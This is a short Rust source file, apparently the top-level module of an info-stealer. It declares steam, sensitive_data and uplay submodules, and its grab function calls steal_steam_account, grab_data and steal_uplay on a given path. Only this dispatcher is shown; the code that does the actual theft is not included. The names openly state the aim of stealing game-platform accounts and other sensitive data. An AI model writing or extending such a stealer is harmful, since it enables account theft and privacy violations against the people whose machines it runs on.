pub mod steam;
pub mod sensitive_data;
pub mod uplay;

pub fn grab(path: String) {

    steam::steal_steam_account(path.clone());
    sensitive_data::grab_data(path.clone());
    uplay::steal_uplay(path.clone());

}